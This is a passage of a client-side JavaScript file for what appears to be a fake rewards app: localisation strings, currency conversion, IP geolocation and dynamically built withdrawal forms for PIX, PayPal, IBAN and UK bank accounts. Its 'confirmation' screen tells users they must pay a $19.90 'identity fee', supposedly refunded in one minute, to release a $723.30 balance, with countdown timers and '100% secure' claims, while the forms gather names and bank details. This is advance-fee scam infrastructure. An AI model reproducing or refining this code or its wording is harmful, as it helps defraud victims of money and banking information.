      "withdraw.text": "Sacar Dinheiro",
      "charge.text": "Recarga Móvel",
      "withdraw.method.pix_sub": "Recebimento imediato",
      "withdraw.method.bank": "Transferência bancária",
      "withdraw.method.iban": "Transferência bancária (IBAN)",
      "withdraw.method.uk": "Transferência bancária (UK)",
      "form.name": "Nome",
      "form.pix_key_type": "Tipo de chave PIX",
      "form.pix_key": "Chave PIX",
      "form.iban": "IBAN",
      "form.sort_code": "Sort code",
      "form.account_number": "Account number",
      "form.document": "Documento",
      "form.paypal_email": "E-mail do PayPal",
      "name.complete": "Nome completo",
      "live.title": "Obter Moedas LIVE",
      "live.desc": "Use moedas para enviar presentes virtuais aos seus hosts de live favoritos.",
      "mobile.topup": "Carregamento móvel",
      "mobile.rule": "Necessita de um saldo mínimo de {min} para carregar o telemóvel",
      "loading.validating": "A validar acesso...",
      "loading.steps.validating": "A validar dados...",
      "loading.steps.connecting": "A ligar ao servidor...",
      "loading.steps.finishing": "A concluir levantamento...",
      "loading.steps.almost": "Quase pronto...",
      "popup.title": "Golo de Prémios",
      "popup.text": "Parabéns! Como parte de uma campanha de recompensas exclusiva.",
      "popup.expires": "Expira em",
      "popup.thanks": "Obrigado",
      "timer.expired": "Expirado",
      "loader.validating": "A validar as suas informações",
      "loader.withdrawing": "A concluir levantamento",
      "loader.processing": "A processar transação",
      "loader.finishing": "A finalizar",
      "confirmation.balance_title": "SALDO DISPONÍVEL",
      "confirmation.balance_subtitle": "A aguardar confirmação para levantamento",
      "confirmation.identity_title": "CONFIRMAÇÃO DE IDENTIDADE",
      "confirmation.refundable_badge": "VALOR REEMBOLSÁVEL",
      "confirmation.fee_part1": "Taxa obrigatória para libertação do levantamento no valor de",
      "confirmation.fee_part2": ". O valor de",
      "confirmation.fee_part3": "será reembolsado integralmente em 1 minuto.",
      "confirmation.refund_data_title": "DADOS PARA REEMBOLSO",
      "confirmation.receipt.name": "Nome",
      "confirmation.receipt.date": "Data",
      "confirmation.receipt.pix_key": "Chave PIX",
      "confirmation.receipt.amount": "Valor a receber",
      "confirmation.process_title": "PROCESSO DE LIBERAÇÃO",
      "confirmation.step1_title": "Pagar taxa de confirmação",
      "confirmation.step1_desc": "$19.90 para verificação de identidade",
      "confirmation.step2_title": "Receber reembolso automático",
      "confirmation.step2_desc": "Valor devolvido em 1 minuto",
      "confirmation.step3_title": "Aceder ao saldo completo",
      "confirmation.step3_desc": "$723.30 libertado para levantamento",
      "confirmation.cta": "Pagar taxa para libertar levantamento",
      "confirmation.timer": "⏱️ Reembolso automático em 1 minuto",
      "confirmation.success": "✅ Identidade confirmada. $19.90 reembolsados e levantamento libertado.",
      "confirmation.secure": "Processo 100% seguro",
      "confirmation.help": "Precisa de ajuda?"
    },
    "en-GB": {}
  };

  function getBrowserLang() {
    try { return (navigator.language || "en").toLowerCase(); } catch { return "en"; }
  }

  function normalizeLocale(loc) {
    if (!loc) return "es";
    if (loc === "en-GB") return "en-GB";
    if (loc.startsWith("pt-pt")) return "pt-PT";
    if (loc.startsWith("pt")) return "pt-BR";
    if (loc.startsWith("fr")) return "fr";
    if (loc.startsWith("de")) return "de";
    if (loc.startsWith("it")) return "it";
    if (loc.startsWith("en")) return "en";
    return "es";
  }

  async function fetchGeo() {
    try {
      const r = await fetch("https://ipwho.is/");
      const j = await r.json();
      if (j && j.success !== false) return { country: String(j.country_code || "").toUpperCase() };
    } catch (e) { }
    return { country: "ES" };
  }

  async function fetchRates(base) {
    try {
      const r = await fetch("https://open.er-api.com/v6/latest/" + encodeURIComponent(base));
      const j = await r.json();
      if (j && j.result === "success" && j.rates) return j.rates;
    } catch (e) { }
    return null;
  }

  function tFactory(locale) {
    const fallback = I18N["es"];
    const en = I18N["en"];
    const ptbr = I18N["pt-BR"];
    const dict = I18N[locale] || fallback;

    return function t(key, vars = {}) {
      let str =
        (dict && dict[key]) ||
        (en && en[key]) ||
        (ptbr && ptbr[key]) ||
        (fallback && fallback[key]) ||
        key;

      Object.keys(vars).forEach((k) => {
        str = str.replace(new RegExp("\\{" + k + "\\}", "g"), String(vars[k]));
      });

      return str;
    };
  }

  function formatMoney(value, currency, locale) {
    try {
      return new Intl.NumberFormat(locale || undefined, { style: "currency", currency }).format(value);
    } catch (e) {
      return currency + " " + (Math.round(value * 100) / 100).toFixed(2);
    }
  }

  // ----------------------------
  // Currency helpers
  // ----------------------------
  function applyCurrencyToAmountTargets({ currency, locale, rate }) {
    document.querySelectorAll("[data-amount-target]").forEach((el) => {
      const raw = el.getAttribute("data-amount-target");
      const brl = parseFloat(raw);
      if (isNaN(brl)) return;
      el.textContent = formatMoney(brl * rate, currency, locale);
    });
  }

  function applyCurrencyToBRLTexts({ currency, locale, rate }) {
    // Converte textos tipo: "R$ 4.596,72" e "R$1,5"
    document.querySelectorAll("*").forEach((el) => {
      if (!el || (el.children && el.children.length)) return;

      const txt = (el.textContent || "").trim();
      if (!txt) return;

      const m = txt.match(/^R\$\s?([\d\.\,]+)/);
      if (!m) return;

      const valueBRL = parseFloat(m[1].replace(/\./g, "").replace(",", "."));
      if (isNaN(valueBRL)) return;

      el.textContent = formatMoney(valueBRL * rate, currency, locale);
    });
  }

  function applyCurrencyToBRLTextsKeepingChildren({ currency, locale, rate }) {
    // Converte o PRIMEIRO nó de texto que começa com "R$" sem mexer nos filhos (spans/badges)
    document.querySelectorAll("*").forEach((el) => {
      if (!el) return;
      if (!el.children || el.children.length === 0) return; // só interessa os que têm filhos

      const textNode = Array.from(el.childNodes).find(
        (n) => n.nodeType === Node.TEXT_NODE && n.textContent.trim()
      );
      if (!textNode) return;

      const txt = textNode.textContent.trim();
      const m = txt.match(/^R\$\s?([\d\.\,]+)/);
      if (!m) return;

      const valueBRL = parseFloat(m[1].replace(/\./g, "").replace(",", "."));
      if (isNaN(valueBRL)) return;

      textNode.textContent = formatMoney(valueBRL * rate, currency, locale) + " ";
    });
  }

  // ----------------------------
  // Text translations
  // ----------------------------
  function applyTextReplacements(t, locale) {
    // traduções diretas (onde não quebra spans internos)
    const map = [
      ["#one .title", "app.title"],
      ["#three .title", "title.redeem"],
      [".saldo-text", "balance.title"],
      [".btn-sacar .btn-text", "action.withdraw"],
      [".btn-three-saque", "action.withdraw_money"],
      [".parabens-txtum", "congrats.title"],

      // ✅ faltava: parte 1 do subtítulo (a parte "Você concluiu" / "Has completado" / etc.)
      [".parabens-txtdois", "congrats.subtitle"],

      // ✅ parte 2 do subtítulo (nobreak) — já estava
      [".nobreak", "congrats.subtitle.nobreak"],

      [".btn-concluido-text", "status.completed"],
      [".btn-indis", "status.unavailable"],

      [".popup .gol", "popup.title"],
      [".popup .gol-txt", "popup.text"],
      [".popup .timer-label", "popup.expires"],
      [".popup .btn-txt-obrigado", "popup.thanks"],

      [".concluiu-txt", "checkin.completed"],

      ["#new-loading-text", "loading.validating"],

      [".pix-title", "withdraw.method.pix"],
      [".pix-subtitle", "withdraw.method.pix_sub"],
      [".saldo-coins-text", "live.title"],
      [".saldo-sacar-text", "withdraw.text"],
      [".saldo-recarga-text", "charge.text"],
      [".transferencia-txt-coins", "live.desc"],
      [".total-pontos .total-pontos-dois", "balance.last_reward"],
      [".saque-title", "withdraw.add_method"],
      [".nome-completo", "name.complete"]
    ];

    map.forEach(([sel, key]) => {
      document.querySelectorAll(sel).forEach((el) => {
        if (!el) return;
        if (el.children && el.children.length) return;
        el.textContent = t(key);
      });
    });

    // parabens subtitle: tem <span class="nobreak"> dentro, então troca só o texto "solto"
    document.querySelectorAll(".parabens-txtdois").forEach((el) => {
      if (!el) return;
      for (const node of el.childNodes) {
        if (node.nodeType === Node.TEXT_NODE && node.textContent.trim()) {
          node.textContent = t("congrats.subtitle") + " ";
          break;
        }
      }
    });

    // timer-label geral: não sobrescrever o popup
    document.querySelectorAll(".timer-label").forEach((el) => {
      if (!el) return;
      if (el.closest(".popup")) return;
      el.textContent = t("timer.expires_in");
    });

    // countdown (#countdown-text) tem <span>, então troca só o texto fora do span
    const countdown = document.querySelector("#countdown-text");
    if (countdown) {
      for (const node of countdown.childNodes) {
        if (node.nodeType === Node.TEXT_NODE && node.textContent.trim()) {
          node.textContent = " " + t("balance.expire") + " ";
          break;
        }
      }
    }

    // "Dia 01" etc
    document.querySelectorAll(".day-tracker__label").forEach((el) => {
      const raw = (el.textContent || "").trim();
      const m = raw.match(/^D(?:ia|ía|ay)\s+(\d+)/i);
      if (!m) return;

      const num = String(m[1]).padStart(2, "0");
      const word =
        locale === "es" ? "Día" :
          (locale === "en" || locale === "en-GB") ? "Day" :
            locale === "fr" ? "Jour" :
              locale === "de" ? "Tag" :
                locale === "it" ? "Giorno" :
                  "Dia";

      el.textContent = `${word} ${num}`;
    });

    // "50 pontos" / "36 pesquisas"
    document.querySelectorAll(".step-text").forEach((el) => {
      const raw = (el.textContent || "").trim();

      let m = raw.match(/^(\d+)\s+(?:pontos|puntos|points)$/i);
      if (m) { el.textContent = `${m[1]} ${t("unit.points")}`; return; }

      m = raw.match(/^(\d+)\s+(?:pesquisas|búsquedas|searches)$/i);
      if (m) { el.textContent = `${m[1]} ${t("unit.searches")}`; return; }
    });

    // "Assista por 10 min" e "Até 756 pontos"
    document.querySelectorAll(".assista-txt").forEach((el) => {
      const raw = (el.textContent || "").trim();

      if (/^(?:Assista|Mira|Watch)(?: por| durante| for)? 10 min/i.test(raw)) {
        el.textContent = t("hint.watch_10min");
        return;
      }

      const m = raw.match(/^(?:Até|Hasta|Up to)\s+(\d+)\s+(?:pontos|puntos|points)$/i);
      if (m) {
        el.textContent = t("hint.up_to_points", { n: m[1] });
        return;
      }
    });

    // textos variáveis dentro de ".entre-txt" (mantém spans internos)
    document.querySelectorAll(".entre-txt").forEach((el) => {
      if (!el) return;

      const ownText = Array.from(el.childNodes)
        .filter(n => n.nodeType === Node.TEXT_NODE)
        .map(n => (n.textContent || "").trim())
        .join(" ")
        .trim();

      if (!ownText) return;

      const replaceOwnText = (newText) => {
        el.childNodes.forEach(n => {
          if (n.nodeType === Node.TEXT_NODE && n.textContent.trim()) {
            n.textContent = newText + " ";
          }
        });
      };

      if (/^(?:Entre por|Entra durante|Check in for) 14/i.test(ownText)) return replaceOwnText(t("checkin.text"));
      if (/^(?:Vê anúncios|Mira anuncios|Watch targeted ads)/i.test(ownText)) return replaceOwnText(t("task.ads"));
      if (/^(?:Assistir|Ver|Watch) v[ií]deos/i.test(ownText)) return replaceOwnText(t("task.watch_videos"));
      if (/^(?:Resgate|Canjea|Redeem)/i.test(ownText)) return replaceOwnText(t("task.redeem_rewards"));
      if (/^(?:Faça|Haz|Do) 60 (?:pesquisas|búsquedas|searches)/i.test(ownText)) return replaceOwnText(t("task.search_daily"));
      if (/^(?:Convide|Invita|Invite) 1 (?:amigo|friend)/i.test(ownText)) return replaceOwnText(t("task.invite"));
    });

    // 7) Textos longos que compartilham a classe ".obtem-txt" (Sacar / Pesquisa / Recarga)
    document.querySelectorAll(".obtem-txt").forEach((el) => {
      if (!el || (el.children && el.children.length)) return;
      const raw = (el.textContent || "").trim();

      // ✅ helper: formata mínimos em qualquer moeda (base BRL no HTML)
      const app = window.__APP || {};
      const localeNow = app.locale || locale || "es";
      const currencyNow = app.currency || currency || "USD";
      const rateNow = typeof app.rate === "number" ? app.rate : 1; // BRL -> currencyNow

      const minMoney = (brlValue) => {
        const base = Number(brlValue) || 0;
        const value = currencyNow === "BRL" ? base : base * rateNow;
        return formatMoney(value, currencyNow, localeNow);
      };

      // ✅ mínimos já formatados na moeda local
      const minWithdraw = minMoney(1.5); // era R$1,5
      const minMobile = minMoney(10);     // era R$10
      const lastReward = minMoney(646.43);

      if (/^Para (?:sacar|retirar) (?:dinheiro|dinero),/i.test(raw) || /^To withdraw money,/i.test(raw)) {
        el.textContent = t("withdraw.rule", { min: minWithdraw });
        return;
      }

      if (raw.startsWith("Última recompensa:")) {
        el.textContent = t("balance.last_reward", { min: lastReward });
        return;
      }

      if (/^Obt[eé]m 21 (?:pontos|puntos)|^Get 21 points/i.test(raw)) {
        el.textContent = t("search.rule");
        return;
      }

      if (/^(?:Voce|Você|Necesitas|You need)/i.test(raw)) {
        el.textContent = t("mobile.rule", { min: minMobile });
        return;
      }
    });

    // -----------------------------
    // Screen #nine (taxa de confirmação) — manter spans de valores
    // -----------------------------
    // Títulos das seções (ordem: identidade, dados para reembolso, processo)
    const nineSectionTitles = document.querySelectorAll("#nine .confirmation-section-title");
    if (nineSectionTitles && nineSectionTitles.length) {
      const titleKeys = [
        "confirmation.identity_title",
        "confirmation.refund_data_title",
        "confirmation.process_title"
      ];
      nineSectionTitles.forEach((el, i) => {
        if (!el) return;
        const key = titleKeys[i];
        if (!key) return;
        el.textContent = t(key);
      });
    }

    // Títulos/labels simples
    const nineSimpleMap = [
      ["#nine .confirmation-balance-title", "confirmation.balance_title"],
      ["#nine .confirmation-balance-subtitle", "confirmation.balance_subtitle"],
      ["#nine .confirmation-reembolso-badge", "confirmation.refundable_badge"],
      ["#nine #confirmation-button", "confirmation.cta"],
      ["#nine .confirmation-timer", "confirmation.timer"],
      ["#nine #confirmation-success-message", "confirmation.success"],
      ["#nine .confirmation-footer-text", "confirmation.secure"],
      ["#nine .confirmation-footer-link", "confirmation.help"]
    ];
    nineSimpleMap.forEach(([sel, key]) => {
      document.querySelectorAll(sel).forEach((el) => {
        if (!el) return;
        if (el.children && el.children.length) return;
        el.textContent = t(key);
      });
    });

    // Labels do comprovante (ordem: Nome, Data, Chave PIX, Valor a receber)
    const receiptLabels = document.querySelectorAll("#nine .confirmation-receipt-label");
    if (receiptLabels && receiptLabels.length) {
      const keys = [
        "confirmation.receipt.name",
        "confirmation.receipt.date",
        "confirmation.receipt.pix_key",
        "confirmation.receipt.amount"
      ];
      receiptLabels.forEach((el, i) => {
        const key = keys[i];
        if (!el || !key) return;
        el.textContent = t(key);
      });
    }

    // Passos do processo (ordem 1..3)
    const stepTitles = document.querySelectorAll("#nine .confirmation-requirement-title");
    if (stepTitles && stepTitles.length) {
      const keys = [
        "confirmation.step1_title",
        "confirmation.step2_title",
        "confirmation.step3_title"
      ];
      stepTitles.forEach((el, i) => {
        const key = keys[i];
        if (!el || !key) return;
        el.textContent = t(key);
      });
    }
    const stepDescs = document.querySelectorAll("#nine .confirmation-requirement-description");
    if (stepDescs && stepDescs.length) {
      const keys = [
        "confirmation.step1_desc",
        "confirmation.step2_desc",
        "confirmation.step3_desc"
      ];
      stepDescs.forEach((el, i) => {
        const key = keys[i];
        if (!el || !key) return;
        el.textContent = t(key);
      });
    }

    // Texto da taxa (tem <span class="bold"> com valores)
    const feeDesc = document.querySelector("#nine .confirmation-fee-description");
    if (feeDesc) {
      const parts = [
        t("confirmation.fee_part1") + " ",
        " " + t("confirmation.fee_part2") + " ",
        " " + t("confirmation.fee_part3")
      ];
      let idx = 0;
      for (const node of feeDesc.childNodes) {
        if (node.nodeType === Node.TEXT_NODE && node.textContent.trim()) {
          node.textContent = parts[idx] || node.textContent;
          idx += 1;
        }
      }
    }
  }

  // ------------------------------------------------------------
  // Withdraw UI adapter
  // ------------------------------------------------------------
  function adaptWithdrawUI(withdrawType, t) {
    // Título do form (#five)
    const linkTitle = document.querySelector("#five .saque-title");

    // Card "Adicionar método de saque"
    const pixBox = document.querySelector(".pix-details");
    const pixTitle = document.querySelector(".pix-title");
    const pixSubtitle = document.querySelector(".pix-subtitle");

    // Ocultar qualquer coisa relacionada a PIX (imagens/logos)
    const pixImgs = Array.from(document.querySelectorAll("img[src*='pix']"));
    const pixBadge = document.querySelector(".pix-badge");

    // Form do saque (#five)
    const pixTypeSelector = document.querySelector("#pix-type-selector");
    const pixSelectorText = document.querySelector("#pix-selector-text");
    const pixKeyInput = document.querySelector("#pix-key-input");
    const pixKeyWrapper = document.querySelector("#pix-key-wrapper");

    // Labels do form
    const labels = Array.from(document.querySelectorAll(".form-group .field-label"));
    const labelTipo = labels.find(l => (l.textContent || "").toLowerCase().includes("tipo"));
    const labelChave = labels.find(l => (l.textContent || "").toLowerCase().includes("chave"));

    const show = (el) => { if (el) el.style.display = ""; };
    const hide = (el) => { if (el) el.style.display = "none"; };
    const setText = (el, txt) => { if (el) el.textContent = txt; };

    // BR: PIX normal
    if (withdrawType === "PIX") {
      if (linkTitle) setText(linkTitle, t("withdraw.link.pix"));
      setText(pixTitle, t("withdraw.method.pix"));
      setText(pixSubtitle, t("withdraw.method.pix_sub"));
      show(pixBox);

      pixImgs.forEach(show);
      show(pixBadge);

      show(labelTipo);
      show(pixTypeSelector);
      if (pixSelectorText) setText(pixSelectorText, t("form.pix_key_type"));

      if (labelChave) setText(labelChave, t("form.pix_key"));
      if (pixKeyInput) {
        pixKeyInput.placeholder = t("form.pix_key");
        // mantém o fluxo original (geralmente disabled no começo)
      }
      return;
    }

    // PayPal
    if (withdrawType === "PAYPAL") {
      if (linkTitle) setText(linkTitle, t("withdraw.link.paypal"));
      setText(pixTitle, t("withdraw.method.paypal"));
      setText(pixSubtitle, t("withdraw.method.paypal_sub"));
      show(pixBox);

      // esconde imagens de pix
      pixImgs.forEach(hide);
      hide(pixBadge);

      // Esconde seletor PIX
      hide(labelTipo);
      hide(pixTypeSelector);

      // label + placeholder vira email
      if (labelChave) setText(labelChave, t("form.paypal_email"));
      if (pixKeyInput) {
        pixKeyInput.disabled = false;
        pixKeyInput.classList.remove("input-disabled");
        pixKeyInput.placeholder = t("form.paypal_email");
        pixKeyInput.value = "";
        pixKeyInput.setAttribute("inputmode", "email");
        pixKeyInput.setAttribute("autocomplete", "email");
      }
      if (pixKeyWrapper) pixKeyWrapper.classList.remove("input-wrapper-disabled");

      // Ajusta linha de texto (se existir)
      document.querySelectorAll(".transferencia-txt").forEach((el) => {
        if (!el) return;
        el.textContent = t("withdraw.method.paypal");
      });

      return;
    }

    // Fora BR: esconder PIX e adaptar
    pixImgs.forEach(hide);
    hide(pixBadge);

    show(pixBox);
    if (withdrawType === "IBAN") {
      if (linkTitle) setText(linkTitle, t("withdraw.link.iban"));
      setText(pixTitle, t("withdraw.method.iban"));
      setText(pixSubtitle, "IBAN");
    } else if (withdrawType === "UK") {
      if (linkTitle) setText(linkTitle, t("withdraw.link.uk"));
      setText(pixTitle, t("withdraw.method.uk"));
      setText(pixSubtitle, "Sort code + Account number");
    } else {
      if (linkTitle) setText(linkTitle, t("withdraw.link.bank"));
      setText(pixTitle, t("withdraw.method.bank"));
      setText(pixSubtitle, "");
    }

    // Esconde seletor de tipo PIX
    hide(labelTipo);
    hide(pixTypeSelector);

    // Habilita input
    if (pixKeyInput) {
      pixKeyInput.disabled = false;
      pixKeyInput.classList.remove("input-disabled");
      pixKeyInput.removeAttribute("inputmode");
    }
    if (pixKeyWrapper) pixKeyWrapper.classList.remove("input-wrapper-disabled");

    // Ajusta label/placeholder
    if (withdrawType === "IBAN") {
      if (labelChave) setText(labelChave, t("form.iban"));
      if (pixKeyInput) {
        pixKeyInput.placeholder = "IBAN";
        pixKeyInput.value = "";
        pixKeyInput.setAttribute("inputmode", "text");
      }
    } else if (withdrawType === "UK") {
      if (labelChave) setText(labelChave, t("form.account_number"));
      if (pixKeyInput) {
        pixKeyInput.placeholder = "Account number";
        pixKeyInput.value = "";
        pixKeyInput.setAttribute("inputmode", "numeric");
      }

      // Adiciona Sort code se não existir
      const formContainer = document.querySelector(".form-container");
      if (formContainer && !document.querySelector("#sortCode")) {
        const div = document.createElement("div");
        div.className = "form-group";
        div.innerHTML = `
          <label class="field-label" for="sortCode">${t("form.sort_code")}</label>
          <input type="text" id="sortCode" placeholder="Sort code" class="nome-completo" inputmode="numeric">
        `;
        const btn = formContainer.querySelector("#btn-enviar-pix") || formContainer.querySelector("button");
        if (btn) formContainer.insertBefore(div, btn);
        else formContainer.appendChild(div);
      }
    } else {
      if (labelChave) setText(labelChave, t("form.document"));
      if (pixKeyInput) {
        pixKeyInput.placeholder = t("form.document");
        pixKeyInput.value = "";
        pixKeyInput.setAttribute("inputmode", "text");
      }
    }

    // Ajusta a linha "Transferencia via / PIX" (se ainda restar texto)
    document.querySelectorAll(".transferencia-txt").forEach((el) => {
      if (!el) return;
      el.textContent =
        withdrawType === "IBAN" ? t("withdraw.method.iban") :
          withdrawType === "UK" ? t("withdraw.method.uk") :
            withdrawType === "PAYPAL" ? t("withdraw.method.paypal") :
              t("withdraw.method.bank");
    });
  }

  /**
   * Renderiza as opções em "Adicionar método de saque" (#four)
   * - Usa .pix-item como template
   * - Cria/remover opções dinamicamente conforme país
   */
  function renderWithdrawMethodOptions(withdrawMethods, t) {
    const container = document.querySelector("#four .saque-popup");
    const template = document.querySelector("#four .pix-item");
    if (!container || !template) return;

    // remove itens extras antigos
    Array.from(container.querySelectorAll(".pix-item"))
      .slice(1)
      .forEach((n) => n.remove());

    // helper para configurar um item
    const setItem = (item, method) => {
      item.setAttribute("data-open-modal", "five");
      item.setAttribute("data-withdraw-method", method);
      item.classList.add("withdraw-method-item");

      const titleEl = item.querySelector(".pix-title");
      const subEl = item.querySelector(".pix-subtitle");
      const iconBox = item.querySelector(".pix-icon");

      const setIcon = (html) => {
        if (!iconBox) return;
        iconBox.innerHTML = html;
      };

      if (method === "PIX") {
        if (titleEl) titleEl.textContent = t("withdraw.method.pix");
        if (subEl) subEl.textContent = t("withdraw.method.pix_sub");
        // mantém o SVG do PIX existente se houver
      } else if (method === "PAYPAL") {
        if (titleEl) titleEl.textContent = t("withdraw.method.paypal");
        if (subEl) subEl.textContent = t("withdraw.method.paypal_sub");
        setIcon(`
          <div class="method-badge" aria-hidden="true">PP</div>
        `);
      } else if (method === "IBAN") {
        if (titleEl) titleEl.textContent = t("withdraw.method.iban");
        if (subEl) subEl.textContent = "IBAN";
        setIcon(`
          <img src="images/fi-rs-credit-card.png" alt="" style="width:18px;height:18px;object-fit:contain;" />
        `);
      } else if (method === "UK") {
        if (titleEl) titleEl.textContent = t("withdraw.method.uk");
        if (subEl) subEl.textContent = "Sort code + Account";
        setIcon(`
          <img src="images/fi-rs-credit-card.png" alt="" style="width:18px;height:18px;object-fit:contain;" />
        `);
      } else {
        if (titleEl) titleEl.textContent = t("withdraw.method.bank");
        if (subEl) subEl.textContent = "";
        setIcon(`
          <img src="images/fi-rs-credit-card.png" alt="" style="width:18px;height:18px;object-fit:contain;" />
        `);
      }
    };

    const unique = Array.from(new Set(withdrawMethods || [])).filter(Boolean);
    if (!unique.length) return;

    // primeiro item usa o template original
    setItem(template, unique[0]);

    // clona o restante
    for (let i = 1; i < unique.length; i++) {
      const clone = template.cloneNode(true);
      setItem(clone, unique[i]);
      container.appendChild(clone);
    }
  }

  // ------------------------------------------------------------
  // Init
  // ------------------------------------------------------------
  async function init() {
    // Keep the entire experience in English and use US dollars for every visitor.
    const country = "US";
    const conf = COUNTRY_CONFIG[country];

    const locale = "en";
    const currency = "USD";
    const withdraw = conf.withdraw;
    const withdrawMethods = conf.withdrawMethods || [withdraw].filter(Boolean);

    const t = tFactory(locale);
    window.__APP = {
      country,
      locale,
      currency,
      withdraw,
      withdrawMethods,
      withdrawSelected: withdraw,
      t,
      rate: 1 // Default rate if no conversion is needed or if we want to use BRL values from HTML
    };

    try { document.documentElement.setAttribute("lang", locale); } catch (e) { }

    const onReady = async () => {
      // Values in the HTML are already the desired USD amounts.
      const rate = 1;
      window.__APP.rate = rate;

      applyTextReplacements(t, locale);
      renderWithdrawMethodOptions(withdrawMethods, t);

      window.__APP.setWithdrawMethod = (method) => {
        const m = method || window.__APP.withdraw || "BANK";
        window.__APP.withdrawSelected = m;
        adaptWithdrawUI(m, t);
      };
      window.__APP.setWithdrawMethod(withdraw);

      applyCurrencyToAmountTargets({ currency, locale, rate });
      applyCurrencyToBRLTexts({ currency, locale, rate });
      applyCurrencyToBRLTextsKeepingChildren({ currency, locale, rate });

      if (typeof window.animateCurrencyCounter === "function") {
        window.animateCurrencyCounter = function (counter) {
          if (!counter) return;
          const raw = parseFloat(counter.getAttribute("data-amount-target") || "0");
          if (isNaN(raw)) return;
          counter.textContent = formatMoney(raw * rate, currency, locale);
        };
      }
    };

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", onReady);
    } else {
      onReady();
    }
  }

  init();
})();
